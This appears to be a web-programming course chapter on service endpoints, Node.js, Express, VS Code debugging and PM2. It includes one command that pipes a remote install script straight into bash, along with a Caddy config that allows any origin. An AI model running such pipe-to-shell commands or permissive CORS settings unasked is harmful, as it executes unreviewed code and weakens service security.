+- **Compatible** - When you build your endpoints you want to make it so that you can add new functionality without breaking existing clients. Usually this means that the clients of your service endpoints should ignore anything that they don't understand. Consider the two following JSON response versions.
+
+  **Version 1**
+
+  ```js
+  {
+    "name": "John Taylor"
+  }
+  ```
+
+  **Version 2**
+
+  ```js
+  {
+    "name": "John Taylor",
+    "givenName": "John",
+    "familyName": "Taylor"
+  }
+  ```
+
+  By adding a new representation of the `name` field, you provide new functionality for clients that know how to use the new fields without harming older clients that ignore the new fields and simply use the old representation. This is all done without officially versioning the endpoint.
+
+  If you are fortunate enough to be able to control all of your client code you can mark the `name` field as depreciated and in a future version remove it once all of the clients have upgraded. Usually you want to keep compatibility with at least one previous version of the endpoint so that there is enough time for all of the clients to migrate before compatibility is removed.
+
+- **Simple** - Keeping your endpoints focused on the primary resources of your application helps to avoid the temptation to add endpoints that duplicate or create parallel access to primary resources. It is very helpful to write some simple class and sequence diagrams that outline your primary resources before you begin coding. These resources should focus on the actual resources of the system you are modeling. They should not focus on the data structure or devices used to host the resources. There should only be one way to act on a resource. Endpoints should only do one thing.
+
+- **Documented** - The [Open API Specification](https://spec.openapis.org/oas/latest.html) is a good example of tooling that helps create, use, and maintain documentation of your service endpoints. It is highly suggested that you make use of such tools in order to provide client libraries for your endpoints and a sandbox for experimentation. Creating an initial draft of your endpoint documentation before you begin coding will help you mentally clarify your design and produce a better final result. Providing access to your endpoint documentation along with your production system helps with client implementations and facilitates easier maintenance of the service. The [Swagger Petstore](https://petstore.swagger.io/) example documentation is a reasonable example to follow.
+
+There are many models for exposing endpoints. We will consider three common ones, RPC, REST, and GraphQL.
+
+## RPC
+
+Remote Procedure Calls (RPC) expose service endpoints as simple function calls. When RPC is used over HTTP it usually just leverages the POST HTTP verb. The actual verb and subject of the function call is represented by the function name. For example, `deleteOrder` or `updateOrder`. The name of the function is either the entire path of the URL or a parameter in the POST body.
+
+```http
+POST /updateOrder HTTP/2
+
+{"id": 2197, "date": "20220505"}
+```
+
+or
+
+```http
+POST /rpc HTTP/2
+
+{"cmd":"updateOrder", "params":{"id": 2197, "date": "20220505"}}
+```
+
+One advantage of RPC is that it maps directly to function calls that might exist within the server. This could also be considered a disadvantage as it directly exposes the inner workings of the service, and thus creates a coupling between the endpoints and the implementation.
+
+## REST
+
+Representational State Transfer (REST) attempts to take advantage of the foundational principles of HTTP. This is not surprising considering the principle author of REST, Roy Fielding, was also a contributor to the HTTP specification. REST HTTP verbs always act upon a resource. Operations on a resource impact the state of the resource as it is transferred by a REST endpoint call. This allows for the caching functionality of HTTP to work optimally. For example, GET will always return the same resource until a PUT is executed on the resource. When PUT is used, the cached resource is replaced with the updated resource.
+
+With REST the updateOrder endpoint would look like the following.
+
+```http
+PUT /order/2197 HTTP/2
+
+{"date": "20220505"}
+```
+
+Where the proper HTTP verb is used and the URL path uniquely identifies the resource. These seem like small differences, but maximizing HTTP pays dividends by making it easy for HTTP infrastructure, such as caching, to work properly.
+
+There are several other pieces of [Fielding's dissertation](https://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm) on REST, such as hypermedia, that are often quoted as being required for a truly "restful" implementation, and these are just as often ignored.
+
+## GraphQL
+
+GraphQL focuses on the manipulation of data instead of a function call (RPC) or a resource (REST). The heart of GraphQL is a query that specifies the desired data and how it should be joined and filtered. GraphQL was developed to address frustration concerning the massive number of REST, or RPC calls, that a web application client needed to make in order to support even a simple UI widget.
+
+Instead of making a call for getting a store, and then a bunch of calls for getting the store's orders and employees, GraphQL would send a single query that would request all of that information in one big JSON response. The server would examine the query, join the desired data, and then filter out anything that was not wanted.
+
+Here is an example GraphQL query.
+
+```graphql
+query {
+  getOrder(id: "2197") {
+    orders(filter: {date: {allofterms: "20220505"}}) {
+      store
+      description
+      orderedBy
+    }
+  }
+}
+```
+
+GraphQL helps to remove a lot of the logic for parsing endpoints and mapping requests to specific resources. Basically in GraphQL there is only one endpoint. The query endpoint.
+
+The downside of that flexibility is that the client now has significant power to consume resources on the server. There is no clear boundary on what, how much, or how complicated the aggregation of data is. It also is difficult for the server to implement authorization rights to data as they have to be baked into the data schema. However, there are standards for how to define a complex schema. Common GraphQL packages provide support for schema implementations along with database adaptors for query support.
+
+
+
+# Node.js
+
+<a id="node-js"></a>Node.js:
+[go to top](#top)
+
+![Node Icon](NodeIcon.png)
+
+In 2009 Ryan Dahl created `Node.js`. It was the first successful application for deploying JavaScript outside of a browser. This changed the JavaScript mindset from a browser technology to one that could run on the server as well. This means that JavaScript can power your entire technology stack. One language to rule them all. Node.js is often just referred to as Node, and is currently maintained by the [Open.js Foundation](https://openjsf.org/).
+
+![Ryan Dahl](webServicesRyanDahl.jpg)
+
+> “You can never understand everything. But, you should push yourself to understand the system”
+>
+> — Ryan Dahl
+
+Browsers run JavaScript using a JavaScript interpreter and execution engine. For example, Chromium based browsers all use the [V8](https://v8.dev/) engine created by Google. Node.js simply took the V8 engine and ran it inside of a console application. When you run a JavaScript program in Chrome or Node.js, it is V8 that reads your code and executes it. With either program wrapping V8, the result is the same.
+
+![Node.js](webServicesNode.jpg)
+
+## Installing NVM and Node.js
+
+Your production environment web server comes with Node.js already installed. However, you will need to install Node.js in your development environment if you have not already. The easiest way to install Node.js is to first install the `Node Version Manager` (NVM) and use it to install, and manage, Node.js.
+
+### Installing on Windows
+
+If you are using Windows, then follow the installation instructions from the [windows-nvm](https://github.com/coreybutler/nvm-windows#installation--upgrades) repository. Click on `latest installer` and then scroll down to the `Assets` and download and execute nvm-setup.exe. Once the installation is complete, you will need to open a new console window so that it gets the updated path that includes NVM.
+
+In the console application install the long term support (LTS) version of Node.
+
+```sh
+➜ nvm install lts
+➜ nvm use lts
+```
+
+### Installing on Linux or MacOS
+
+If you are using Linux or MacOS then you can install NVM with the following console commands.
+
+```sh
+➜ curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash
+
+➜ . ~/.nvm/nvm.sh
+```
+
+In the console application install the long term support (LTS) version of Node.
+
+```sh
+➜ nvm install --lts
+```
+
+## Checking that Node is installed
+
+The node.js console application is simply called `node`. You can verify that Node is working correctly by running `node` with the `-v` parameter. Note that your version might be different than what is shown here. As long as it is an LTS version you should be fine.
+
+```sh
+➜ node -v
+v18.13.0
+```
+
+## Running programs
+
+You can execute a line of JavaScript with Node.js from your console with the `-e` parameter.
+
+```sh
+➜  node -e "console.log(1+1)"
+2
+```
+
+However, to do real work you need to execute an entire project composed of dozens or even hundreds of JavaScript files. You do this by creating a single starting JavaScript file, named something like `index.js`, that references the code found in the rest of your project. You then execute your code by running `node` with `index.js` as a parameter. For example, with the following JavaScript saved to a file named `index.js`
+
+```js
+function countdown() {
+  let i = 0;
+  while (i++ < 5) {
+    console.log(`Counting ... ${i}`);
+  }
+}
+
+countdown();
+```
+
+We can execute the JavaScript by passing the file to `node`, and receive the following result.
+
+```sh
+➜  node index.js
+Counting ... 1
+Counting ... 2
+Counting ... 3
+Counting ... 4
+Counting ... 5
+```
+
+You can also run `node` in interpretive mode by executing it without any parameters and then typing your JavaScript code directly into the interpreter.
+
+```sh
+➜ node
+Welcome to Node.js v16.15.1.
+> 1+1
+2
+> console.log('hello')
+hello
+```
+
+## Node package manager
+
+While you could write all of the JavaScript for everything you need, it is always helpful to use preexisting packages of JavaScript for implementing common tasks. To load a package using Node.js you must take two steps. First install the package locally on your machine using the Node Package Manager (NPM), and then include a `require` statement in your code that references the package name. NPM is automatically installed when you install Node.js.
+
+NPM knows how to access a massive repository of preexisting packages. You can search for packages on the [NPM website](https://www.npmjs.com/). However, before you start using NPM to install packages you need to initialize your code to use NPM. This is done by creating a directory that will contain your JavaScript and then running `npm init`. NPM will step you through a series of questions about the project you are creating. You can press the return key for each of questions if you want to accept the defaults. If you are always going to accept all of the defaults you can use `npm init -y` and skip the Q&A.
+
+```sh
+➜  mkdir npmtest
+➜  cd npmtest
+➜  npm init -y
+```
+
+## Package.json
+
+If you list the files in the directory you will notice that it has created a file named `package.json`. This file contains three main things: 1) Metadata about your project such as its name and the default entry JavaScript file, 2) commands (scripts) that you can execute to do things like run, test, or distribute your code, and 3) packages that this project depends upon. The following shows what your `package.json` looks like currently. It has some default metadata and a simple placeholder script that just runs the echo command when you execute `npm run test` from the console.
+
+```json
+{
+  "name": "npmtest",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  }
+}
+```
+
+With NPM initialized to work with your project, you can now use it to install a node package. As a simple example, we will install a package that knows how to tell jokes. This package is called `give-me-a-joke`. You can search for it on the [NPM website](https://www.npmjs.com/), see how often it is installed, examine the source code, and learn about who created it. You install the package using `npm install` followed by the name of the package.
+
+```sh
+➜  npm install give-me-a-joke
+```
+
+If you again examine the contents of the `package.json` file you will see a reference to the newly installed package dependency. If you decide you no longer want a package dependency you can always remove it with the `npm uninstall <package name here>` console command.
+
+With the dependency added, the unnecessary metadata removed, the addition of a useful script to run the program, and also adding a description, the `package.json` file should look like this:
+
+```json
+{
+  "name": "npmtest",
+  "version": "1.0.0",
+  "description": "Simple Node.js demo",
+  "main": "index.js",
+  "license": "MIT",
+  "scripts": {
+    "dev": "node index.js"
+  },
+  "dependencies": {
+    "give-me-a-joke": "^0.5.1"
+  }
+}
+```
+
+⚠ Note that when you start installing package dependencies, NPM will create an additional file named `package-lock.json` and a directory named `node_modules` in your project directory. The `node_modules` directory contains the actual JavaScript files for the package and all of its dependent packages. As you install several packages this directory will start to get very large. You do **not** want to check this directory into your source control system since it can be very large and can be rebuilt using the information contained in the `package.json` and `package-lock.json` files. So make sure you include `node_modules` in your `.gitignore` file.
+
+When you clone your source code from GitHub to a new location, the first thing you should do is run `npm install` in the project directory. This will cause NPM to download all of the previously installed packages and recreate the `node_modules` directory.
+
+The `package-lock.json` file tracks the version of the package that you installed. That way if you rebuild your `node_modules` directory you will have the version of the package you initially installed and not the latest available version, which might not be compatible with your code.
+
+With NPM and the joke package installed, you can now use the joke package in a JavaScript file by referencing the package name as a parameter to the `require` function. This is then followed by a call to the joke object's `getRandomDadJoke` function to actually generate a joke. Create a file named `index.js` and paste the following into it.
+
+**index.js**
+
+```js
+const giveMeAJoke = require('give-me-a-joke');
+giveMeAJoke.getRandomDadJoke((joke) => {
+  console.log(joke);
+});
+```
+
+If you run this code using `node.js` you should get a result similar to the following.
+
+```sh
+➜  node index.js
+What do you call a fish with no eyes? A fsh.
+```
+
+This may seem like a lot of work but after you do it a few times it will begin to feel natural. Just remember the main steps.
+
+1. Create your project directory
+1. Initialize it for use with NPM by running `npm init -y`
+1. Make sure `.gitignore` file contains `node_modules`
+1. Install any desired packages with `npm install <package name here>`
+1. Add `require('<package name here>')` to your application's JavaScript
+1. Use the code the package provides in your JavaScript
+1. Run your code with `node index.js`
+
+## Creating a web service
+
+With JavaScript we can write code that listens on a network port (e.g. 80, 443, 3000, or 8080), receives HTTP requests, processes them, and then responds. We can use this to create a simple web service that we then execute using Node.js.
+
+First create your project.
+
+```sh
+➜ mkdir webservicetest
+➜ cd webservicetest
+➜ npm init -y
+```
+
+Now, open VS Code and create a file named `index.js`. Paste the following code into the file and save.
+
+```js
+const http = require('http');
+const server = http.createServer(function (req, res) {
+  res.writeHead(200, { 'Content-Type': 'text/html' });
+  res.write(`<h1>Hello Node.js! [${req.method}] ${req.url}</h1>`);
+  res.end();
+});
+
+server.listen(8080, () => {
+  console.log(`Web service listening on port 8080`);
+});
+```
+
+This code uses the Node.js built-in `http` package to create our HTTP server using the `http.createServer` function along with a callback function that takes a request (`req`) and response (`res`) object. That function is called whenever the server receives an HTTP request. In our example, the callback always returns the same HTML snippet, with a status code of 200, and a Content-Type header, no matter what request is made. Basically this is just a simple dynamically generated HTML page. A real web service would examine the HTTP path and return meaningful content based upon the purpose of the endpoint.
+
+The `server.listen` call starts listening on port 8080 and blocks until the program is terminated.
+
+We execute the program by going back to our console window and running Node.js to execute our index.js file. If the service starts up correctly then it should look like the following.
+
+```sh
+➜ node index.js
+Web service listening on port 8080
+```
+
+You can now open your browser and point it to `localhost:8080` and view the result. The interaction between the JavaScript, node, and the browser looks like this.
+
+![Node HTTP](webServicesNodeHttp.jpg)
+
+Use different URL paths in the browser and note that it will echo the HTTP method and path back in the document. You can kill the process by pressing `CTRL-C` in the console.
+
+Note that you can also start up Node and execute the `index.js` code directly in VS Code. To do this open index.js in VS Code and press the 'F5' key. This should ask you what program you want to run. Select `node.js`. This starts up Node.js with the `index.js` file, but also attaches a debugger so that you can set breakpoints in the code and step through each line of code.
+
+⚠ Make sure you complete the above steps. For the rest of the course you will be executing your code using Node.js to run your backend code and serve up your frontend code to the browser. This means you will no longer be using the `VS Code Live Server extension` to serve your frontend code in the browser.
+
+## Deno and Bun
+
+You should be aware that Ryan has created a successor to Node.js called [`Deno`](https://deno.land/). This version is more compliant with advances in ECMAScript and has significant performance enhancements. There are also competitor server JavaScript applications. One of the more interesting rising stars is called [`Bun`](https://bun.sh/). If you have the time you should learn about them.
+
+
+
+# Express
+
+<a id="express"></a>Express:
+[go to top](#top)
+
+📖 **Deeper dive reading**: [MDN Express/Node introduction](https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/Introduction)
+
+In the previous instruction you saw how to use Node.js to create a simple web server. This works great for little projects where you are trying to quickly serve up some web content, but to build a production ready application you need a framework with a bit more functionality for easily implementing a full web service. This is where the Node package `Express` come in. Express provides support for:
+
+1. Routing requests for service endpoints
+1. Manipulating HTTP requests with JSON body content
+1. Generating HTTP responses
+1. Using `middleware` to add functionality
+
+Express was created by TJ Holowaychuk and is currently maintained by the [Open.js Foundation](https://openjsf.org/).
+
+![TJ Holowaychuk](webServicesHolowaychuk.jpg)
+
+> “People tell you to not reinvent things, but I think you should … it will teach you things”
+>
+> — TJ Holowaychuk
+
+Everything in Express revolves around creating and using HTTP routing and middleware functions.
+You create an Express application by using NPM to install the Express package and then calling the `express` constructor to create the Express application and listen for HTTP requests on a desired port.
+
+```sh
+➜ npm install express
+```
+
+```js
+const express = require('express');
+const app = express();
+
+app.listen(8080);
+```
+
+With the `app` object you can now add HTTP routing and middleware functions to the application.
+
+## Defining routes
+
+HTTP endpoints are implemented in Express by defining routes that call a function based upon an HTTP path. The Express `app` object supports all of the HTTP verbs as functions on the object. For example, if you want to have a route function that handles an HTTP GET request for the URL path `/store/provo` you would call the `get` method on the app.
+
+```js
+app.get('/store/provo', (req, res, next) => {
+  res.send({name: 'provo'});
+});
+```
+
+The `get` function takes two parameters, a URL path matching pattern, and a callback function that is invoked when the pattern matches. The path matching parameter is used to match against the URL path of an incoming HTTP request.
+
+The callback function has three parameters that represent the HTTP request object (`req`), the HTTP response object (`res`), and the `next` routing function that Express expects to be called if this routing function wants another function to generate a response.
+
+The Express `app` compares the routing function patterns in the order that they are added to the Express `app` object. So if you have two routing functions with patterns that both match, the first one that was added will be called and given the next matching function in the `next` parameter.
+
+In our example above we hard coded the store name to be `provo`. A real store endpoint would allow any store name to be provided as a parameter in the path. Express supports path parameters by prefixing the parameter name with a colon (`:`). Express creates a map of path parameters and populates it with the matching values found in the URL path. You then reference the parameters using the `req.params` object. Using this pattern you can rewrite our getStore endpoint as follows.
+
+```js
+app.get('/store/:storeName', (req, res, next) => {
+  res.send({name: req.params.storeName});
+});
+```
+
+If we run our JavaScript using `node` we can see the result when we make an HTTP request using `curl`.
+
+```sh
+➜ curl localhost:8080/store/orem
+{"name":"orem"}
+```
+
+If you wanted an endpoint that used the POST or DELETE HTTP verb then you just use the `post` or `delete` function on the Express `app` object.
+
+The route path can also include a limited wildcard syntax or even full regular expressions in path pattern. Here are a couple route functions using different pattern syntax.
+
+```js
+// Wildcard - matches /store/x and /star/y
+app.put('/st*/:storeName', (req, res) => res.send({update: req.params.storeName}));
+
+// Pure regular expression
+app.delete(/\/store\/(.+)/, (req, res) => res.send({delete: req.params[0]}));
+```
+
+Notice that in these examples the `next` parameter was omitted. Since we are not calling `next` we do not need to include it as a parameter. However, if you do not call `next` then no following middleware functions will be invoked for the request.
+
+## Using middleware
+
+📖 **Deeper dive reading**: [Express Middleware](https://expressjs.com/en/resources/middleware.html)
+
+The standard [Mediator/Middleware](https://www.patterns.dev/posts/mediator-pattern/) design pattern has two pieces: a mediator and middleware. Middleware represents componentized pieces of functionality. The mediator loads the middleware components and determines their order of execution. When a request comes to the mediator it then passes the request around to the middleware components. Following this pattern, Express is the mediator, and middleware functions are the middleware components.
+
+Express comes with a standard set of middleware functions. These provide functionality like routing, authentication, CORS, sessions, serving static web files, cookies, and logging. Some middleware functions are provided by default, and other ones must be installed using NPM before you can use them. You can also write your own middleware functions and use them with Express.
+
+A middleware function looks very similar to a routing function. That is because routing functions are also middleware functions. The only difference is that routing functions are only called if the associated pattern matches. Middleware functions are always called for every HTTP request unless a preceding middleware function does not call `next`. A middleware function has the following pattern:
+
+```js
+function middlewareName(req, res, next)
+```
+
+The middleware function parameters represent the HTTP request object (`req`), the HTTP response object (`res`), and the `next` middleware function to pass processing to. You should usually call the `next` function after completing processing so that the next middleware function can execute.
+
+![Middleware](webServicesMiddleware.jpg)
+
+### Creating your own middleware
+
+As an example of writing your own middleware, you can create a function that logs out the URL of the request and then passes on processing to the next middleware function.
+
+```js
+app.use((req, res, next) => {
+  console.log(req.originalUrl);
+  next();
+});
+```
+
+Remember that the order that you add your middleware to the Express app object controls the order that the middleware functions are called. Any middleware that does not call the `next` function after doing its processing, stops the middleware chain from continuing.
+
+### Builtin middleware
+
+In addition to creating your own middleware functions, you can use a built-in middleware function. Here is an example of using the `static` middleware function. This middleware responds with static files, found in a given directory, that match the request URL.
+
+```js
+app.use(express.static('public'));
+```
+
+Now if you create a subdirectory in your project directory and name it `public` you can serve up any static content that you would like. For example, you could create an `index.html` file that is the default content for your web service. Then when you call your web service without any path the `index.html` file will be returned.
+
+### Third party middleware
+
+You can also use third party middleware functions by using NPM to install the package and including the package in your JavaScript with the `require` function. The following uses the `cookie-parser` package to simplify the generation and access of cookies.
+
+```sh
+➜ npm install cookie-parser
+```
+
+```js
+const cookieParser = require('cookie-parser');
+
+app.use(cookieParser());
+
+app.post('/cookie/:name/:value', (req, res, next) => {
+  res.cookie(req.params.name, req.params.value);
+  res.send({cookie: `${req.params.name}:${req.params.value}`});
+});
+
+app.get('/cookie', (req, res, next) => {
+  res.send({cookie: req.cookies});
+});
+```
+
+It is common for middleware functions to add fields and functions to the `req` and `res` objects so that other middleware can access the functionality they provide. You see this happening when the `cookie-parser` middleware adds the `req.cookies` object for reading cookies, and also adds the `res.cookie` function in order to make it easy to add a cookie to a response.
+
+## Error handling middleware
+
+You can also add middleware for handling errors that occur. Error middleware looks similar to other middleware functions, but it takes an additional `err` parameter that contains the error.
+
+```js
+function errorMiddlewareName(err, req, res, next)
+```
+
+If you wanted to add a simple error handler for anything that might go wrong while processing HTTP requests you could add the following.
+
+```js
+app.use(function (err, req, res, next) {
+  res.status(500).send({type: err.name, message: err.message});
+});
+```
+
+We can test that our error middleware is getting used by adding a new endpoint that generates an error.
+
+```js
+app.get('/error', (req, res, next) => {
+  throw new Error('Trouble in river city');
+});
+```
+
+Now if we use `curl` to call our error endpoint we can see that the response comes from the error middleware.
+
+```sh
+➜ curl localhost:8080/error
+{"type":"Error","message":"Trouble in river city"}
+```
+
+## Putting it all together
+
+Here is a full example of our web service built using Express.
+
+```js
+const express = require('express');
+const cookieParser = require('cookie-parser');
+const app = express();
+
+// Third party middleware - Cookies
+app.use(cookieParser());
+
+app.post('/cookie/:name/:value', (req, res, next) => {
+  res.cookie(req.params.name, req.params.value);
+  res.send({cookie: `${req.params.name}:${req.params.value}`});
+});
+
+app.get('/cookie', (req, res, next) => {
+  res.send({cookie: req.cookies});
+});
+
+// Creating your own middleware - logging
+app.use((req, res, next) => {
+  console.log(req.originalUrl);
+  next();
+});
+
+// Built in middleware - Static file hosting
+app.use(express.static('public'));
+
+// Routing middleware
+app.get('/store/:storeName', (req, res) => {
+  res.send({name: req.params.storeName});
+});
+
+app.put('/st*/:storeName', (req, res) => res.send({update: req.params.storeName}));
+
+app.delete(/\/store\/(.+)/, (req, res) => res.send({delete: req.params[0]}));
+
+// Error middleware
+app.get('/error', (req, res, next) => {
+  throw new Error('Trouble in river city');
+});
+
+app.use(function (err, req, res, next) {
+  res.status(500).send({type: err.name, message: err.message});
+});
+
+// Listening to a network port
+const port = 8080;
+app.listen(port, function () {
+  console.log(`Listening on port ${port}`);
+});
+```
+
+# ☑ Assignment
+
+Create a web service with Express using the following steps.
+
+1. Open your console.
+1. Create a directory named testExpress, and change into that directory
+
+   ```sh
+   mkdir testExpress
+   cd testExpress
+   ```
+
+1. Initialize the directory for use with NPM.
+
+   ```sh
+   npm init -y
+   ```
+
+1. Install the `express` and `cookie-parser` packages.
+
+   ```sh
+   npm install express cookie-parser
+   ```
+
+1. Create a file named `index.js` and paste the example code given above.
+1. Create a directory named `public` and add an `index.html` file with some basic html to the directory.
+
+   ```sh
+   mkdir public
+   print '<h1>Hello express</h1>' > public/index.html
+   ```
+
+1. Run your web service using `node` (`node index.js`)
+
+   ```sh
+   node index.js
+   ```
+
+1. Open another console window and use Curl to try out your web service by making requests to the endpoints.
+
+   ```sh
+   curl localhost:8080
+   curl localhost:8080/error
+   curl localhost:8080/store/orem
+   curl -X PUT localhost:8080/st/orem
+   curl -X DELETE localhost:8080/store/orem
+   curl -X POST -c cookies.txt localhost:8080/cookie/express/tj
+   curl -b cookies.txt localhost:8080/cookie
+   ```
+
+1. Develop a mental model in your head about what these commands are doing and how your service is responding. Perhaps creating a [sequence diagram](https://sequencediagram.org/index.html#initialData=C4S2BsFMAIGVIE4DcQGMYCVIEcCukBnYAgKBIENVgB7BaAYVwXDMeYFoA+eZNSALmgBtAAoBVACoBdaAHois2pAC2JAHbVgMBCADmAC2DRqAMziIU6fuQAONgHQ3cwABQByecABUs-kSUAcuTKkG4ANAA6atAuCDhh0HEEAJTQALyciYT2BJBqACYuUQDe0Lg2+eRagnHYjuQIwQQ5NHFBIdAAvsnJANwkbOAAPEPs7DyWAtDFAETllVoz-DNKyjOdJEA) will help clarify the interaction if it is still unclear.
+
+   ![HTTP request](httpRequestSequenceDiagram.jpg)
+
+When you are done executing the above commands, copy the output from the curl commands and paste it into the Canvas assignment.
+
+
+
+# Debugging Node.js
+
+<a id="debug-node-js"></a>Debugging Node.js:
+[go to top](#top)
+
+🔑 **Required reading**: [Debugging a Node.js application](https://youtu.be/B0le_Z_2TQY)
+
+📖 **Deeper dive reading**: [Node.js debugging in VS Code](https://code.visualstudio.com/docs/nodejs/nodejs-debugging)
+
+Previously your JavaScript debugging was done by running the `Live Server` VS Code extension and using the browser's debugging tools as it executed in the browser. Now that you are writing JavaScript that runs using Node.js, you need a way to launch and debug your code that runs outside of the browser. One great way to do that is to use the debugging tools built into VS Code. To debug JavaScript in VS Code you first need some JavaScript to debug. Open up VS Code and create a new file named `main.js` and paste the following code into the file.
+
+```js
+let x = 1 + 1;
+
+console.log(x);
+
+function double(x) {
+  return x * 2;
+}
+
+x = double(x);
+
+console.log(x);
+```
+
+You can now debug `main.js` in VS Code by executing the `Start Debugging` command by pressing `F5`. The first time you run this, VS Code will ask you what debugger you want to use. Select `Node.js`.
+
+![Debug start](webServicesDebugStart.png)
+
+The code will execute and the debug console window will automatically open to show you the debugger output where you can see the results of the two `console.log` statements found in the code.
+
+![Debug output](webServicesDebugOutput.png)
+
+You can pause execution of the code by setting a breakpoint. Move your cursor over to the far left side of the editor window. As you hover on the left side of the line numbers you will see a red dot appear. Click on the dot to set the breakpoint.
+
+![Debug output](webServicesDebugBreakpoint.png)
+
+Now start the debugger again by pressing `F5`. The code will start running, but pause on the line with the breakpoint. You can then see the values of variables by looking at the variable window on the left, or by hovering your mouse over the variable you would like to inspect.
+
+![Debug pause](webServicesDebugPaused.png)
+
+You can continue execution of the code by pressing `F10` to step to the next line, `F11` to step into a function call, or `F5` to continue running from the current line. When the last line of code executes the debugger will automatically exit and you will need to press `F5` to start it running again. You can stop debugging at any time by pressing `SHIFT-F5`.
+
+Experiment with this simple file until you are comfortable running the debugger, setting breakpoints, and inspecting variables.
+
+## Debugging a Node.js web service
+
+In order to debug a web service running under Node.js we first need to write our code. Replace the code in your `main.js` file with the following.
+
+```js
+const express = require('express');
+const app = express();
+
+app.get('/*', (req, res) => {
+  res.send({ url: req.originalUrl });
+});
+
+const port = 8080;
+app.listen(port, function () {
+  console.log(`Listening on port ${port}`);
+});
+```
+
+Switch to your console application and run `npm init -y` and `npm install express` from your code directory so that we can use the Express package to write a simple web service.
+
+Now we are ready to debug again. Set a breakpoint on the getStore endpoint callback (line 5) and the `app.listen` call (line 9). Start debugging by pressing `F5`. The debugger should stop on the `listen` call where you can inspect the `app` variable. Press `F5` again to continue running. Now open up your browser and set the location to `localhost:8080`. This should hit the breakpoint on the endpoint. Take some time to inspect the `req` object. You should be able to see what the HTTP method is, what parameters are provided, and what the path currently is. Press `F5` to continue.
+
+Your browser should display the JSON object, containing the URL, that you returned from your endpoint. Now change the URL in the browser to include a path and some query parameters. Something like `http://localhost:8080/fish/taco?order=2`. Requesting that URL should cause your breakpoint to hit again where you can see the URL changes reflected in the req object.
+
+Now, instead of pressing `F5` to continue, press `F11` to step into the `res.send` function. This will take you out of your code and into the Express code that handles sending a response. Because you installed the Express package using NPM, all of Express's source code is sitting in the `node_modules` directory. You can also set breakpoints there, examine variables, and step into functions. Debugging into popular packages is a great way to learn how to code by seeing how really good programmers do things. Take some time to walk around Holowaychuk's code and see if you can understand what it is doing.
+
+![Debug step in](webServicesDebugStepIn.png)
+
+## Nodemon
+
+Once you start writing complex web applications you will find yourself making changes in the middle of debugging sessions and you would like to have `node` restart automatically and update the browser as the changes are saved. This seems like a simple thing, but over the course of hundreds of changes, every second you can save really starts to add up.
+
+The [Nodemon package](https://www.npmjs.com/package/nodemon) is basically a wrapper around `node` that watches for files in the project directory to change. When it detects that you saved something it will automatically restart `node`.
+
+If you would like to experiment with this then take the following steps. First install Nodemon globally so that you can use it to debug all of your projects.
+
+```sh
+npm install -g nodemon
+```
+
+Then, because VS Code does not know how to launch Nodemon automatically, you need create a VS Code launch configuration. In VS Code press `CTRL-SHIFT-P` (on Windows) or `⌘-SHIFT-P` (on Mac) and type the command `Debug: Add configuration`. This will then ask you what type of configuration you would like to create. Type `Node.js` and select the `Node.js: Nodemon setup` option. In the launch configuration file that it creates, change the program from `app.js` to `main.js` (or whatever the main JavaScript file is for your application) and save the configuration file.
+
+Now when you press `F5` to start debugging it will run Nodemon instead of Node.js, and your changes will automatically update your application when you save.
+
+
+
+# PM2
+
+<a id="pm2"></a>Service Daemons - PM2:
+[go to top](#top)
+
+When you run a program from the console, the program will automatically terminate when you close the console or if the computer restarts. In order to keep programs running after a shutdown you need to register it as a `daemon`. The term daemon comes from the idea of something that is always there working in the background. Hopefully you only have good daemons running in your background.
+
+We want our web services to continue running as a daemon. We would also like an easy way to start and stop our services. That is what [Process Manager 2](https://pm2.keymetrics.io/docs/usage/quick-start/) (PM2) does.
+
+PM2 is already installed on your production server as part of the AWS AMI that you selected when you launched your server. Additionally, the deployment scripts found with the Simon projects automatically modify PM2 to register and restart your web services. That means you should not need to do anything with PM2. However, if you run into problems such as your services not running, then here are some commands that you might find useful.
+
+You can SSH into your server and see PM2 in action by running the following command.
+
+```sh
+pm2 ls
+```
+
+This should print out the two services, simon and startup, that are configured to run on your web server.
+
+You can try some of the other commands, but only if you understand what they are doing. Using them incorrectly could cause your web services to stop working.
+
+| Command                                                    | Purpose                                                                          |
+| ---------------------------------------------------------- | -------------------------------------------------------------------------------- |
+| **pm2 ls**                                                 | List all of the hosted node processes                                            |
+| **pm2 monit**                                              | Visual monitor                                                                   |
+| **pm2 start index.js -n simon**                            | Add a new process with an explicit name                                          |
+| **pm2 start index.js -n startup -- 4000**                  | Add a new process with an explicit name and port parameter                       |
+| **pm2 stop simon**                                         | Stop a process                                                                   |
+| **pm2 restart simon**                                      | Restart a process                                                                |
+| **pm2 delete simon**                                       | Delete a process from being hosted                                               |
+| **pm2 delete all**                                         | Delete all processes                                                             |
+| **pm2 save**                                               | Save the current processes across reboot                                         |
+| **pm2 restart all**                                        | Reload all of the processes                                                      |
+| **pm2 restart simon --update-env**                         | Reload process and update the node version to the current environment definition |
+| **pm2 update**                                             | Reload pm2                                                                       |
+| **pm2 start env.js --watch --ignore-watch="node_modules"** | Automatically reload service when index.js changes                               |
+| **pm2 describe simon**                                     | Describe detailed process information                                            |
+| **pm2 startup**                                            | Displays the command to run to keep PM2 running after a reboot.                  |
+| **pm2 logs simon**                                         | Display process logs                                                             |
+| **pm2 env 0**                                              | Display environment variables for process. Use `pm2 ls` to get the process ID    |
+
+## Registering a new web service
+
+If you want to setup another subdomain that accesses a different web service on your web server, you need to follow these steps.
+
+1. Add the rule to the Caddyfile to tell it how to direct requests for the domain.
+2. Create a directory and add the files for the web service.
+3. Configure PM2 to host the web service.
+
+### Modify Caddyfile
+
+SSH into your server.
+
+Copy the section for the startup subdomain and alter it so that it represents the desired subdomain and give it a different port number that is not currently used on your server. For example:
+
+```sh
+tacos.cs260.click {
+  reverse_proxy _ localhost:5000
+  header Cache-Control none
+  header -server
+  header Access-Control-Allow-Origin *
+}
+```
+
+This tells Caddy that when it gets a request for tacos.cs260.click it will act as a proxy for those requests and pass them on to the web service that is listening on the same machine (localhost), on port 5000. The other settings tell Caddy to return headers that disable caching, hide the fact that Caddy is the server (no reason to tell hackers anything about your server), and to allow any other origin server to make endpoint requests to this subdomain (basically disabling CORS). Depending on what your web service does you may want different settings.
+
+Restart Caddy to cause it to load the new settings.
+
+```sh
+sudo service caddy restart
